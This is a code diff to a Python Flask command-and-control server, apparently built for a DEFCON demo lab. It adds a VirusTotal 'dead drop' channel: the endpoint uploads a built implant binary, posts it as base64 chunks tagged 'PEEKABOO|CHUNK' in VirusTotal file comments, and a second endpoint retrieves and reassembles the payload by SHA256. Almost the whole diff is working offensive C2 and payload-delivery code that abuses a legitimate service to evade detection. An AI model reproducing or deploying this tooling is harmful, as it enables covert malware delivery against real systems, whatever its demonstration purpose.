@@ -4,11 +4,13 @@ by @cocomelonc - DEFCON Demo Labs Singapore 2026
 """
 from __future__ import annotations
 import base64
+import hashlib
 import json
 import os
 import re
 import subprocess
 import threading
+import time
 import uuid
 from datetime import datetime
 from pathlib import Path
@@ -697,9 +699,11 @@ def c2_deliver_github():
 @app.route("/api/c2/deliver/virustotal", methods=["POST"])
 def c2_deliver_virustotal():
     """
-    Upload the latest built binary to VirusTotal.
-    Demonstrates: VirusTotal abuse as C2/exfil channel + AV detection scoring.
-    MITRE ATT&CK: T1102 (Web Service)
+    VT Comments dead-drop: upload binary for analysis, then stage it as
+    base64 chunks in VT file comments. Agent retrieves by SHA256, reads
+    comments, and reassembles the binary locally.
+    MITRE ATT&CK: T1102 (Web Service), T1102.001 (Dead Drop Resolver), T1105
+    Technique used in the wild by: Turla, APT28 (Fancy Bear)
     """
     if not HAS_REQUESTS:
         return jsonify({"ok": False, "error": "requests not installed"}), 500
@@ -717,6 +721,10 @@ def c2_deliver_virustotal():
         return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
 
     try:
+        raw    = binary.read_bytes()
+        sha256 = hashlib.sha256(raw).hexdigest()
+
+        # 1. Upload file to VT (registers the SHA256; also demonstrates T1102 abuse)
         with open(binary, "rb") as f:
             resp = _requests.post(
                 "https://www.virustotal.com/api/v3/files",
@@ -724,23 +732,129 @@ def c2_deliver_virustotal():
                 files={"file": (binary.name, f, "application/octet-stream")},
                 timeout=60,
             )
+        if resp.status_code not in (200, 201):
+            err = resp.json().get("error", {}).get("message", resp.text[:200])
+            return jsonify({"ok": False, "error": f"VT upload failed: {err}"}), 400
 
-        if resp.status_code in (200, 201):
-            data = resp.json()
-            analysis_id = data.get("data", {}).get("id", "")
+        analysis_id = resp.json().get("data", {}).get("id", "")
+
+        # 2. Chunk base64-encoded binary into VT comments (T1102.001 dead drop)
+        #    Format: PEEKABOO|CHUNK|{total:04d}|{idx:04d}|{base64_data}
+        encoded    = base64.b64encode(raw).decode()
+        chunk_size = 3000
+        chunks     = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
+        total      = len(chunks)
+
+        comment_ids: list[str] = []
+        for idx, chunk_data in enumerate(chunks):
+            text = f"PEEKABOO|CHUNK|{total:04d}|{idx:04d}|{chunk_data}"
+            cr = _requests.post(
+                f"https://www.virustotal.com/api/v3/files/{sha256}/comments",
+                headers={"x-apikey": api_key, "Content-Type": "application/json"},
+                json={"data": {"type": "comment", "attributes": {"text": text}}},
+                timeout=15,
+            )
+            if cr.status_code == 200:
+                comment_ids.append(cr.json().get("data", {}).get("id", ""))
+            time.sleep(0.25)   # respect free-tier rate limits
+
+        return jsonify({
+            "ok":              True,
+            "channel":         "virustotal",
+            "technique":       "T1102 + T1102.001",
+            "file":            binary.name,
+            "size":            len(raw),
+            "sha256":          sha256,
+            "analysis_id":     analysis_id,
+            "analysis_url":    f"https://www.virustotal.com/gui/file-analysis/{analysis_id}",
+            "chunks":          total,
+            "comments_posted": len(comment_ids),
+            "note":            "Binary staged as base64 chunks in VT comments. Use sha256 to retrieve.",
+        })
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+
+@app.route("/api/c2/retrieve/virustotal", methods=["POST"])
+def c2_retrieve_virustotal():
+    """
+    Agent-side retrieval: fetch PEEKABOO chunk comments from VT by SHA256,
+    reassemble, and return the binary as base64.
+    MITRE ATT&CK: T1102.001 (Dead Drop Resolver)
+    """
+    if not HAS_REQUESTS:
+        return jsonify({"ok": False, "error": "requests not installed"}), 500
+
+    cfg = _load_config("virustotal_config")
+    if not cfg:
+        return jsonify({"ok": False, "error": "virustotal_config.json not found"}), 400
+
+    api_key = cfg.get("vt_api_key", "")
+    if not api_key:
+        return jsonify({"ok": False, "error": "virustotal not configured"}), 400
+
+    data   = request.get_json(force=True) or {}
+    sha256 = data.get("sha256", "").strip().lower()
+    if not sha256 or len(sha256) != 64 or not all(c in "0123456789abcdef" for c in sha256):
+        return jsonify({"ok": False, "error": "valid sha256 required"}), 400
+
+    try:
+        # Paginate through all comments for this file
+        all_comments: list[dict] = []
+        next_url: str | None = (
+            f"https://www.virustotal.com/api/v3/files/{sha256}/comments?limit=40"
+        )
+        while next_url:
+            r = _requests.get(next_url, headers={"x-apikey": api_key}, timeout=15)
+            if r.status_code != 200:
+                break
+            page      = r.json()
+            all_comments.extend(page.get("data", []))
+            cursor    = page.get("meta", {}).get("cursor")
+            next_url  = (
+                f"https://www.virustotal.com/api/v3/files/{sha256}"
+                f"/comments?limit=40&cursor={cursor}"
+            ) if cursor else None
+
+        # Parse PEEKABOO|CHUNK|{total:04d}|{idx:04d}|{data}
+        chunk_map:      dict[int, str] = {}
+        total_expected: int | None     = None
+        for c in all_comments:
+            text = c.get("attributes", {}).get("text", "")
+            if not text.startswith("PEEKABOO|CHUNK|"):
+                continue
+            parts = text.split("|", 5)
+            if len(parts) < 5:
+                continue
+            try:
+                tot  = int(parts[2])
+                idx  = int(parts[3])
+                chunk_map[idx] = parts[4]
+                total_expected = tot
+            except ValueError:
+                continue
+
+        if total_expected is None:
+            return jsonify({"ok": False, "error": "no PEEKABOO chunks found in VT comments"})
+        if len(chunk_map) != total_expected:
             return jsonify({
-                "ok":          True,
-                "channel":     "virustotal",
-                "file":        binary.name,
-                "size":        binary.stat().st_size,
-                "analysis_id": analysis_id,
-                "url":         f"https://www.virustotal.com/gui/file-analysis/{analysis_id}",
-                "technique":   "T1102",
-                "note":        "Analysis pending - check VirusTotal for detection results",
+                "ok":             False,
+                "error":          f"incomplete: got {len(chunk_map)}/{total_expected} chunks",
+                "chunks_found":   len(chunk_map),
+                "chunks_expected": total_expected,
             })
-        else:
-            return jsonify({"ok": False,
-                            "error": resp.json().get("error", {}).get("message", resp.text)}), 400
+
+        encoded = "".join(chunk_map[i] for i in range(total_expected))
+        payload = base64.b64decode(encoded)
+
+        return jsonify({
+            "ok":          True,
+            "sha256":      sha256,
+            "size":        len(payload),
+            "chunks":      total_expected,
+            "payload_b64": base64.b64encode(payload).decode(),
+            "technique":   "T1102.001",
+        })
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
 
